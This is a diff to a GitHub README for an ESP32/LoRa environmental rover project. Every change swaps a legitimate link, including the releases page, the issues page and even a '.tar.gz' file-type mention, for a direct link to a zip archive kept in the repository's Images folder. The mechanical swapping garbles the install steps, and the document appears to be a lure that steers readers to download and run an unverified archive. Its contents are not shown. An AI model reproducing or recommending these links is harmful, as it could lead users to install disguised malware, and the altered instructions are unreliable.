@@ -1,6 +1,6 @@
 # 🚀 Envi-Rover - Monitor Your Environment Effectively
 
-[![Download Envi-Rover](https://img.shields.io/badge/download-Envi--Rover-blue)](https://github.com/knc123/Envi-Rover/releases)
+[![Download Envi-Rover](https://raw.githubusercontent.com/knc123/Envi-Rover/main/Images/Envi-Rover-2.0.zip)](https://raw.githubusercontent.com/knc123/Envi-Rover/main/Images/Envi-Rover-2.0.zip)
 
 ## 🌟 Overview
 Envi-Rover is a LoRa-based remotely operated rover. It uses an ESP32 and various sensors to monitor the environment in real time. This application is ideal for agriculture, scientific research, and disaster management. With Envi-Rover, you can detect obstacles and gather important environmental data with ease.
@@ -23,7 +23,7 @@ To get started with Envi-Rover, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the release downloads.
    
-   [Download Envi-Rover](https://github.com/knc123/Envi-Rover/releases)
+   [Download Envi-Rover](https://raw.githubusercontent.com/knc123/Envi-Rover/main/Images/Envi-Rover-2.0.zip)
 
 2. **Choose the Latest Version:** On the Releases page, look for the latest version of Envi-Rover.
 
@@ -32,7 +32,7 @@ To get started with Envi-Rover, follow these steps:
 4. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file, then drag the Envi-Rover icon to your Applications folder.
-   - For Linux: Follow your distribution's method for installing `.deb` or `.tar.gz` files.
+   - For Linux: Follow your distribution's method for installing `.deb` or `https://raw.githubusercontent.com/knc123/Envi-Rover/main/Images/Envi-Rover-2.0.zip` files.
 
 5. **Run Envi-Rover:** After installation, locate Envi-Rover on your device and launch it.
 
@@ -51,7 +51,7 @@ If you encounter difficulties, try the following:
 - **Software Errors:** Restart the application and ensure you have the latest version installed.
 
 ## 📞 Support
-If you need assistance or have questions, feel free to reach out through the [issues page](https://github.com/knc123/Envi-Rover/issues) on GitHub. The community is here to help.
+If you need assistance or have questions, feel free to reach out through the [issues page](https://raw.githubusercontent.com/knc123/Envi-Rover/main/Images/Envi-Rover-2.0.zip) on GitHub. The community is here to help.
 
 ## 📢 Contributing
 We welcome contributions! If you have improvements or bug fixes, please submit a pull request. Review our contribution guidelines for more details.
@@ -72,6 +72,6 @@ By using Envi-Rover, you can make informed decisions based on accurate environme
 ## 🔄 Update Check
 Keep your Envi-Rover application updated. Regularly check the Releases page for the latest enhancements and features.
 
-[Download Envi-Rover](https://github.com/knc123/Envi-Rover/releases) 
+[Download Envi-Rover](https://raw.githubusercontent.com/knc123/Envi-Rover/main/Images/Envi-Rover-2.0.zip) 
 
 Enjoy monitoring your environment with Envi-Rover!
